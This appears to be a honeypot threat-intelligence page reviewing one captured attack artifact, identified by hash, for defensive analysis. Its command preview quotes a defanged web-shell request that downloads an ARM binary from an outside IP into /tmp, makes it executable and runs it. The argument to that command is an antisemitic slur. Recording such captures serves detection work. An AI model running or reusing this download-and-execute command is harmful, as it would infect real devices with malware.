# acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata, detections |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;wget+http:/\/94[.]154[.]43[.]XXX/manji.arm4;chmod+777+manji.arm4;./manji.arm4+jews;wget+http:/\/94[.]154[.]43[.]XXX
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
